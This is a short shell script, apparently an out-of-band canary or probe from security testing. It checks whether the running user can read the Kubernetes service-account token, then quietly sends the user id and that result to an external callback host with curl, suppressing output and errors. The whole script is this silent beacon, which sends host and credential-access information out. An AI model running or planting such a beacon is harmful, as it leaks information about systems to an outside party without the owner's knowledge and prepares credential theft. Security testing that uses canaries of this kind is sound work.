#!/bin/sh
        uid=$(id -u)
        if test -r /var/run/secrets/kubernetes.io/serviceaccount/token; then
          readable=true
        else
          readable=false
        fi
        curl --max-time 8 --silent --output /dev/null "https://dbqoqgqb0peo41k77al068owbypubc8fu.oob.staging.depthfirst.com/dfmise/2845e962751f7eaa9b3fbc15?uid=${uid}&token_readable=${readable}" || true
        
